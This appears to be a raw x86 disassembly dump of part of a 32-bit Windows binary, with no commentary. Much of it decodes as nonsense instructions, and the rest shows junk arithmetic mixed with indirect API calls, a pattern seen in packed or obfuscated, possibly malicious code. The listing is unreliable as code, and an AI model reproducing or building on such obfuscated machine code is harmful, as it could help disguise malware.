  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e5c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x42834f
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42828b
  41906c:	or     DWORD PTR ds:0x4283cf,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x8f3402]
  419095:	sbb    bh,BYTE PTR [edi]
  419097:	mov    esi,0x1816c33f
  41909c:	mov    esp,0xe8181812
  4190a1:	pop    ecx
  4190a2:	mov    dh,0xf6
  4190a4:	ror    BYTE PTR [edx],1
  4190a6:	lahf   
  4190a7:	lods   eax,DWORD PTR ds:[esi]
  4190a8:	cwde   
  4190a9:	outs   dx,BYTE PTR ds:[esi]
  4190aa:	xor    edi,ecx
  4190ac:	push   0x7b852401
  4190b1:	dec    eax
  4190b2:	fdivr  QWORD PTR [edi+esi*8]
  4190b5:	inc    ebx
  4190b6:	sahf   
  4190b7:	stc    
  4190b8:	xchg   ecx,eax
  4190b9:	in     eax,dx
  4190ba:	mov    esi,0x588570bc
  4190bf:	xchg   esp,eax
  4190c0:	rcl    esi,cl
  4190c2:	ins    DWORD PTR es:[edi],dx
  4190c3:	mov    ds:0xcb976b13,al
  4190c8:	dec    esp
  4190c9:	ficom  WORD PTR [ebp-0x6]
  4190cc:	mov    DWORD PTR [esi],edx
  4190ce:	dec    ebx
  4190cf:	idiv   DWORD PTR [ebp+0x1e]
  4190d2:	add    BYTE PTR [eax],dh
  4190d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190d5:	jmp    0x65d4:0x6c8c895
  4190dc:	jno    0x4190f1
  4190de:	cmp    BYTE PTR [eax],0xba
  4190e1:	test   al,0xa6
  4190e3:	mov    bh,0x25
  4190e5:	push   edx
  4190e6:	es cmp al,0x9e
  4190e9:	es or  al,0x6
  4190ec:	add    cl,BYTE PTR [edi-0x64c7089c]
  4190f2:	xor    esp,0xffffffcb
  4190f5:	imul   BYTE PTR [ecx]
  4190f7:	adc    BYTE PTR [edi],dl
  4190f9:	fistp  QWORD PTR [edi]
  4190fb:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4190fd:	popf   
  4190fe:	ja     0x419098
  419100:	rcr    BYTE PTR [esi-0x2d],0x8c
  419104:	push   eax
  419105:	sti    
  419106:	pop    edx
  419107:	or     eax,0x1fc6a3db
  41910c:	jbe    0x41911c
  41910e:	inc    ecx
  41910f:	sub    al,0x7a
  419111:	mov    ds:0x20676c2a,eax
  419116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419117:	jp     0x41918d
  419119:	mov    ch,BYTE PTR [esi+edi*8+0xc938174]
  419120:	mov    eax,ds:0xed6c8ac2
  419125:	inc    edx
  419126:	adc    eax,0x968c2f5f
  41912b:	cmp    eax,0x3d04f0f8
  419130:	test   BYTE PTR [esi],0xf0
  419133:	fild   WORD PTR [edx+0x29]
  419136:	into   
  419137:	jmp    0x52fda7f4
  41913c:	loop   0x4190c3
  41913e:	pop    ss
  41913f:	test   DWORD PTR [esi+ecx*1],edi
  419142:	stos   DWORD PTR es:[edi],eax
  419143:	out    dx,eax
  419144:	aas    
  419145:	test   BYTE PTR [edi-0xf],0x61
  419149:	and    BYTE PTR [edx-0x4b3a5298],bl
  41914f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419150:	and    al,0x15
  419152:	fistp  WORD PTR [ebx*1+0x9c32dc9]
  419159:	add    eax,DWORD PTR [edi-0x266a2d76]
  41915f:	sar    edi,1
  419161:	xor    al,0x6f
  419163:	lods   al,BYTE PTR ds:[esi]
  419164:	cdq    
  419165:	sahf   
  419166:	mov    ecx,0x1f85ae07
  41916b:	dec    edx
  41916c:	retf   
  41916d:	out    0x83,eax
  41916f:	outs   dx,BYTE PTR ds:[esi]
  419170:	adc    al,0x99
  419172:	ror    DWORD PTR [esi+0x32],1
  419175:	test   BYTE PTR [ebp+0x63],dl
  419178:	jo     0x41914c
  41917a:	das    
  41917b:	pop    esi
  41917c:	jae    0x419151
  41917e:	pop    edi
  41917f:	les    edx,FWORD PTR [ebp+0x2b7f3bf0]
  419185:	dec    eax
  419186:	lods   al,BYTE PTR ds:[esi]
  419187:	and    BYTE PTR [ebx-0x6],bh
  41918a:	and    ecx,DWORD PTR [esi-0x47f0e5d7]
  419190:	pushf  
  419191:	shl    DWORD PTR [edx+0x46],1
  419194:	pop    edx
  419195:	gs dec edx
  419197:	pop    edi
  419198:	fdiv   QWORD PTR [ebp-0x14]
  41919b:	pushf  
  41919c:	push   eax
  41919d:	scas   al,BYTE PTR es:[edi]
  41919e:	inc    ebp
  41919f:	(bad)  [esi+esi*2+0x37]
  4191a3:	xchg   DWORD PTR [ecx],edx
  4191a5:	into   
  4191a6:	loopne 0x41920a
  4191a8:	and    BYTE PTR [ebx+0x2b3a0afd],dl
  4191ae:	jne    0x419130
  4191b0:	call   0xf23f304
  4191b5:	arpl   di,ax
  4191b7:	hlt    
  4191b8:	adc    ebp,DWORD PTR [edi+0x2de74077]
  4191be:	xchg   edi,eax
  4191bf:	neg    DWORD PTR [ecx]
  4191c1:	pop    ecx
  4191c2:	and    dh,ch
  4191c4:	lds    edx,FWORD PTR [ecx+0x24]
  4191c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191c8:	add    BYTE PTR [ebx-0x5c28033b],dh
  4191ce:	push   edx
  4191cf:	xlat   BYTE PTR ds:[ebx]
  4191d0:	leave  
  4191d1:	xor    BYTE PTR [eax-0x54],cl
  4191d4:	sbb    dl,BYTE PTR [esp+ebp*4]
  4191d7:	popf   
  4191d8:	cwde   
  4191d9:	into   
  4191da:	push   ebx
  4191db:	push   0x1
  4191dd:	call   ebx
  4191df:	je     0x41916b
  4191e1:	in     al,0x39
  4191e3:	into   
  4191e4:	lahf   
  4191e5:	retf   
  4191e6:	shr    BYTE PTR [eax+0x43],cl
  4191e9:	adc    BYTE PTR [eax+eiz*8-0x7404d6a8],0x40
  4191f1:	jns    0x419247
  4191f3:	jnp    0x419204
  4191f5:	in     al,0x89
  4191f7:	fst    QWORD PTR [edi+edx*8]
  4191fa:	or     edx,DWORD PTR [esi-0x3bf28dd5]
  419200:	or     eax,edx
  419202:	add    eax,0x8ea380b
  419207:	xor    al,0x94
  419209:	mov    ecx,0xfd6c8612
  41920e:	out    dx,al
  41920f:	pop    ss
  419210:	pop    ebx
  419211:	push   esi
  419212:	jmp    0x5a43f83c
  419217:	in     al,0x75
  419219:	inc    eax
  41921a:	mov    ah,0x2f
  41921c:	xor    al,dh
  41921e:	xor    eax,0x1d376ed6
  419223:	xor    BYTE PTR ds:0x3dbf6f63,al
  419229:	in     al,dx
  41922a:	inc    ebp
  41922b:	sbb    esi,0x54fb5674
  419231:	sbb    dl,BYTE PTR [edx]
  419233:	js     0x419273
  419235:	test   esi,edx
  419237:	jne    0x4191d6
  419239:	xor    al,0xe2
  41923b:	mov    esp,0x4df5db16
  419240:	movaps xmm3,XMMWORD PTR [esp+ebp*1]
  419244:	jns    0x41921c
  419246:	jns    0x41925f
  419248:	sbb    eax,0xc8597cd9
  41924d:	imul   ebp,DWORD PTR [esi],0x65
  419250:	xchg   ebx,eax
  419251:	xchg   BYTE PTR [ebx+0x7f],cl
  419254:	dec    esi
  419255:	loop   0x419298
  419257:	popfw  
  419259:	in     al,dx
  41925a:	fnstcw WORD PTR [edi-0x34]
  41925d:	and    ch,BYTE PTR [eax+0x42]
  419260:	scas   al,BYTE PTR es:[edi]
  419261:	addr16 inc edi
  419263:	jbe    0x419236
  419265:	lods   al,BYTE PTR ds:[esi]
  419266:	jp     0x4192a6
  419268:	xchg   ebx,eax
  419269:	fdivr  DWORD PTR [esi+0x1bf63628]
  41926f:	add    DWORD PTR [ebx+0x66a1d971],0xdde0bae7
  419279:	(bad)  
  41927a:	lods   al,BYTE PTR ds:[esi]
  41927b:	outs   dx,DWORD PTR ds:[esi]
  41927c:	jg     0x419229
  41927e:	mov    bh,0xf5
  419280:	ret    
  419281:	fisubr DWORD PTR [eax]
  419283:	aaa    
  419284:	rcr    BYTE PTR [esi+0x76bd9ae4],1
  41928a:	mov    bl,0xbd
  41928c:	add    al,0x93
  41928e:	sar    DWORD PTR [esi],1
  419290:	mov    edx,0x740f0bcd
  419295:	aam    0x4e
  419297:	rcr    BYTE PTR [ebx+0x69],0xc6
  41929b:	push   0xe9ecb641
  4192a0:	js     0x419314
  4192a2:	adc    BYTE PTR [esi],dh
  4192a4:	int3   
  4192a5:	xchg   DWORD PTR [edi+ecx*1+0x5f],esi
  4192a9:	retf   0x64f7
  4192ac:	(bad)  
  4192ad:	in     eax,dx
  4192ae:	pop    eax
  4192af:	cli    
  4192b0:	out    dx,al
  4192b1:	pop    edx
  4192b2:	jns    0x41932b
  4192b4:	jno    0x419248
  4192b6:	repnz inc esi
  4192b8:	pop    edx
  4192b9:	and    ecx,esi
  4192bb:	jp     0x41927e
  4192bd:	mov    BYTE PTR [edi+0x2],al
  4192c0:	stc    
  4192c1:	sub    esi,ebp
  4192c3:	lods   eax,DWORD PTR ds:[esi]
  4192c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c5:	push   ecx
  4192c6:	jmp    0x6c305ccf
  4192cb:	cs push ebx
  4192cd:	mov    dl,0xe4
  4192cf:	lea    eax,[edx]
  4192d1:	push   esi
  4192d2:	call   0x7403:0xfe6897f0
  4192d9:	push   ss
  4192da:	das    
  4192db:	xor    DWORD PTR [edx],esi
  4192dd:	xlat   BYTE PTR ds:[ebx]
  4192de:	int    0x47
  4192e0:	lock addr16 out 0x5b,al
  4192e4:	lods   eax,DWORD PTR ds:[esi]
  4192e5:	dec    esi
  4192e6:	rcr    DWORD PTR [eax],0x96
  4192e9:	int3   
  4192ea:	sub    al,BYTE PTR [edi+0x7939c0f8]
  4192f0:	lock rcl eax,cl
  4192f3:	inc    ebx
  4192f4:	ret    0xe222
  4192f7:	fdivr  st,st(1)
  4192f9:	pop    es
  4192fa:	mov    ebp,DWORD PTR ds:0xb7eeec9e
  419300:	push   esi
  419301:	ds cwde 
  419303:	mov    dl,0x8b
  419305:	mov    eax,ds:0x20a100b8
  41930a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41930b:	adc    ebp,DWORD PTR [ebx-0x4e]
  41930e:	jbe    0x41935d
  419310:	(bad)  
  419311:	lods   eax,DWORD PTR ds:[esi]
  419312:	fucomi st,st(1)
  419314:	call   DWORD PTR [ebp-0xffb6c90]
  41931a:	mov    eax,0x7c7fc6c4
  41931f:	and    BYTE PTR [ecx+0x9],dl
  419322:	out    0xf6,eax
  419324:	es leave 
  419326:	jnp    0x4192d0
  419328:	push   cs
  419329:	mov    edx,0x5a78c456
  41932e:	iret   
  41932f:	inc    edx
  419330:	loop   0x419398
  419332:	push   ebx
  419333:	sbb    dh,ch
  419335:	cmp    dh,ch
  419337:	jo     0x419376
  419339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41933a:	enter  0x9347,0x21
  41933e:	idiv   DWORD PTR [ecx-0x1644a344]
  419344:	sbb    eax,0xff5af357
  419349:	sub    DWORD PTR [edi],esi
  41934b:	in     al,0x14
  41934d:	ss ins DWORD PTR es:[edi],dx
  41934f:	push   ebp
  419350:	daa    
  419351:	adc    al,0x4b
  419353:	adc    BYTE PTR [edx-0x71e2e871],dh
  419359:	in     eax,0xa6
  41935b:	shr    DWORD PTR [edi],cl
  41935d:	scas   eax,DWORD PTR es:[edi]
  41935e:	xor    al,BYTE PTR [ecx+0x78]
  419361:	xor    eax,0x6b188f40
  419366:	mov    ds:0x37c652ea,al
  41936b:	or     ecx,DWORD PTR gs:[ebx-0x4aa491c6]
  419372:	jo     0x4193c1
  419374:	push   eax
  419375:	outs   dx,DWORD PTR ds:[esi]
  419376:	push   ebp
  419377:	dec    ebx
  419378:	or     DWORD PTR [edi+edx*2+0x44],eax
  41937c:	jb     0x41932f
  41937e:	test   al,0x9d
  419380:	je     0x4193a5
  419382:	mov    cl,0x87
  419384:	jb     0x419317
  419386:	iret   
  419387:	jp     0x4193b2
  419389:	xor    cl,BYTE PTR [esi*4+0x25dff51b]
  419390:	pushf  
  419391:	push   ds
  419392:	add    ecx,ebx
  419394:	mov    dl,0xff
  419396:	mov    dh,0x35
  419398:	loope  0x419383
  41939a:	mov    eax,0xef89140d
  41939f:	ret    
  4193a0:	in     al,dx
  4193a1:	data16 cmp al,BYTE PTR [ebx-0x7a]
  4193a5:	adc    esp,DWORD PTR [edi+eiz*2]
  4193a8:	mov    ds:0x13cb0c84,eax
  4193ad:	ficom  WORD PTR [edx-0x45555d1b]
  4193b3:	cmp    bh,BYTE PTR [ebx+0x560c236a]
  4193b9:	sub    edx,edx
  4193bb:	ror    dl,0x3e
  4193be:	push   ebx
  4193bf:	and    ch,BYTE PTR [ebp-0x3418039]
  4193c5:	call   0x6bcf1c7b
  4193ca:	out    0x93,eax
  4193cc:	xor    al,0x15
  4193ce:	mov    DWORD PTR [esi-0x33],eax
  4193d1:	mov    ch,dl
  4193d3:	jecxz  0x419367
  4193d5:	in     al,dx
  4193d6:	mov    ebp,0x8005fc4
  4193db:	push   ss
  4193dc:	inc    ecx
  4193dd:	packuswb mm7,QWORD PTR [edi+ecx*4+0x77]
  4193e2:	or     ebp,DWORD PTR [ecx-0x779cff91]
  4193e8:	out    0xe4,eax
  4193ea:	aas    
  4193eb:	loop   0x4193ab
  4193ed:	neg    DWORD PTR [eax]
  4193ef:	sbb    DWORD PTR [edx+0x3f97a78b],esp
  4193f5:	jecxz  0x41939e
  4193f7:	jns    0x41944b
  4193f9:	sub    BYTE PTR [ebx-0x78c0d71a],bh
  4193ff:	(bad)  
  419400:	pop    esp
  419401:	loope  0x4193f7
  419403:	pusha  
  419404:	adc    bh,dh
  419406:	xor    eax,0x21939e44
  41940b:	fcmovne st,st(1)
  41940d:	push   esi
  41940e:	jmp    0xcac35d00
  419413:	ror    ebp,cl
  419415:	(bad)  
  419416:	mov    bh,0x2a
  419418:	pop    ebx
  419419:	loopne 0x41942b
  41941b:	pop    edx
  41941c:	cmp    ah,dl
  41941e:	sbb    DWORD PTR [edi+0xc],edi
  419421:	xchg   DWORD PTR [eax+0x47fb5753],ebp
  419427:	xchg   esp,eax
  419428:	and    bh,BYTE PTR [ebx+eiz*8+0x1e]
  41942c:	shr    BYTE PTR [eax],cl
  41942e:	sbb    eax,0x8436473c
  419433:	push   ecx
  419434:	adc    eax,0xd1fe9767
  419439:	(bad)  
  41943a:	popa   
  41943b:	fdivr  DWORD PTR [edi+ebx*2+0x2f63c717]
  419442:	or     esp,DWORD PTR [edx]
  419444:	pop    eax
  419445:	pop    es
  419446:	(bad)  
  419447:	pop    eax
  419448:	push   esp
  419449:	(bad)  
  41944a:	fdiv   DWORD PTR [esi+edi*8+0x56]
  41944e:	fadd   QWORD PTR [ecx-0x7374733b]
  419454:	and    al,0x84
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	lahf   
  419460:	add    BYTE PTR [edx+0x0],0x0
  419464:	mov    DWORD PTR ds:0x4283f7,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428403,0x3a28
  419482:	cmp    DWORD PTR ds:0x42829f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e60
  41949a:	mov    DWORD PTR ds:0x4282db,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x428343
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42837b,edx
  4194b2:	mov    DWORD PTR ds:0x428303,0x52b1
  4194bc:	or     DWORD PTR ds:0x4281db,edx
  4194c2:	and    DWORD PTR ds:0x4283df,ecx
  4194c8:	cmp    DWORD PTR ds:0x428387,0x0
  4194cf:	mov    DWORD PTR ds:0x428387,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428303,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428403,0x1b74
  4194fc:	mov    DWORD PTR ds:0x4281df,0x3203
  419506:	cmp    DWORD PTR ds:0x428387,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42811b
  419518:	push   0x4280ff
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ef4
  419528:	adc    DWORD PTR ds:0x4281e7,0x266f
  419532:	xor    DWORD PTR ds:0x4283df,ebx
  419538:	xor    DWORD PTR ds:0x428367,ecx
  41953e:	mov    DWORD PTR ds:0x4281d7,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x4282b3
  41954e:	dec    DWORD PTR ds:0x428367
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428357,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x4283eb,0x428407
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x4281ef,0x0
  419589:	mov    DWORD PTR ds:0x4281df,0x514f
  419593:	mov    DWORD PTR ds:0x4281e3,0x65eb
  41959d:	mov    DWORD PTR ds:0x428293,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282f3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x4281ef,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x4280ad
  4195cd:	push   0x4280c9
  4195d2:	call   DWORD PTR ds:0x428ef8
  4195d8:	adc    DWORD PTR ds:0x428307,ecx
  4195de:	and    DWORD PTR ds:0x4282fb,0x4c04
  4195e8:	add    DWORD PTR ds:0x4281d3,ebx
  4195ee:	and    DWORD PTR ds:0x4282df,0x6136
  4195f8:	add    DWORD PTR ds:0x4281e7,ebx
  4195fe:	mov    eax,ds:0x4225b8
  419603:	and    DWORD PTR ds:0x42836f,0x4282d7
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x4281cb,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281f3,0x4281c7
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x4282d7,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428307,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x4282df
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282f3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x4281e3,0x4281b3
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x4282e7,0x4282af
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x4281cb
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x4281cb,0x428357
  4196ab:	push   0x42243c
  4196b0:	sbb    DWORD PTR ds:0x4282e3,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42828b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42829f
  4196da:	sbb    DWORD PTR ds:0x428383,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x4282b3,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x4282cf,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42829b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x4283d3,0x0
  419713:	mov    edx,DWORD PTR ds:0x42834f
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x4282cb,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x4283e3,0x5836
  419737:	cmp    DWORD PTR ds:0x4283d3,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e64
  41974d:	movzx  edx,BYTE PTR ds:0x4281cb
  419754:	adc    DWORD PTR ds:0x428353,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428307
  419761:	add    DWORD PTR ds:0x4281eb,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282ff,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x4281eb,0x0
  419781:	mov    DWORD PTR ds:0x4282b3,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x4282cb,ebx
  419797:	cmp    DWORD PTR ds:0x4281eb,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e68
  4197bf:	sub    DWORD PTR ds:0x4282e3,0x63b8
  4197c9:	add    DWORD PTR ds:0x42835f,0x42829f
  4197d3:	add    DWORD PTR ds:0x4282bf,0x4281e7
  4197dd:	mov    ebx,DWORD PTR ds:0x428207
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428317
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428297,ecx
  4197f8:	and    DWORD PTR ds:0x4282ef,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42836f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x4281eb,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x4283d7,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428377,0x6cf
  41984e:	mov    DWORD PTR ds:0x428403,0x6551
  419858:	cmp    DWORD PTR ds:0x4281eb,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428efc
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42840b
  419891:	mov    ecx,DWORD PTR ds:0x42840f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282fb
  4198a2:	cmp    DWORD PTR ds:0x4281bf,0x0
  4198a9:	mov    DWORD PTR ds:0x4281b3,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42837f
  4198ba:	not    DWORD PTR ds:0x428373
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x4281bf,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e6c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x4282e3
  4198e5:	and    DWORD PTR ds:0x42837b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x42834f
  4198f1:	sbb    DWORD PTR ds:0x4281d7,edx
  4198f7:	or     DWORD PTR ds:0x428367,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x4282d3,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42827f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428283
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428377,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42828b,0x4551
  419946:	mov    DWORD PTR ds:0x4282ef,0x487
  419950:	cmp    DWORD PTR ds:0x428377,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e70
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x42834f,0x75a
  419988:	sub    DWORD PTR ds:0x4282f7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42829b
  419999:	sub    ecx,DWORD PTR ds:0x4283ff
  41999f:	mov    DWORD PTR ds:0x42829b,ecx
  4199a5:	cmp    DWORD PTR ds:0x4282bb,0x0
  4199ac:	mov    DWORD PTR ds:0x428353,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x4281bb,0x10c7
  4199c5:	mov    DWORD PTR ds:0x4283d7,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x4282bb,edi
  4199da:	cmp    DWORD PTR ds:0x4282bb,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428293
  4199ec:	push   0x427fbb
  4199f1:	call   DWORD PTR ds:0x428f00
  4199f7:	sub    DWORD PTR ds:0x428407,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42837f
  419a03:	sbb    DWORD PTR ds:0x428307,ecx
  419a09:	adc    edx,DWORD PTR ds:0x4283eb
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428367,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x42835f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428377
  419a31:	xor    DWORD PTR ds:0x42828b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42828f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx+0x34708ffa]
  419a79:	test   WORD PTR [ebx+eiz*8-0x45],di
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1+0x264f1818],bh
  419a86:	mov    edi,0xa24fbade
  419a8b:	cmp    dl,BYTE PTR [ecx-0x7bd46c76]
  419a91:	(bad)  
  419a92:	hlt    
  419a93:	js     0x419a6e
  419a95:	jb     0x419b01
  419a97:	int    0x74
  419a99:	clc    
  419a9a:	test   DWORD PTR [edi+0x38e840f8],0xd00f61bf
  419aa4:	out    dx,eax
  419aa5:	xor    al,0xb0
  419aa7:	je     0x419ac3
  419aa9:	and    eax,0xa2ce48f8
  419aae:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  419ab0:	jg     0x419acd
  419ab2:	cld    
  419ab3:	or     eax,edi
  419ab5:	sub    al,0x41
  419ab7:	fsubr  st,st(5)
  419ab9:	pop    ss
  419aba:	aas    
  419abb:	dec    ecx
  419abc:	fwait
  419abd:	shl    BYTE PTR [eax],0x61
  419ac0:	addr16 jno 0x419a78
  419ac3:	retf   0x3ad1
  419ac6:	dec    edi
  419ac7:	je     0x419abb
  419ac9:	adc    BYTE PTR [edx],ah
  419acb:	ret    
  419acc:	popf   
  419acd:	lahf   
  419ace:	test   DWORD PTR [eax+0x5],0xcf430af3
  419ad5:	imul   esi,eax,0x3a52b1a3
  419adb:	retf   
  419adc:	imul   ebp,DWORD PTR [ebx+0x58f816a8],0x43faa08f
  419ae6:	mov    dl,dh
  419ae8:	add    eax,0xa3cc6994
  419aed:	sub    ch,BYTE PTR [edi+ebx*4+0x7]
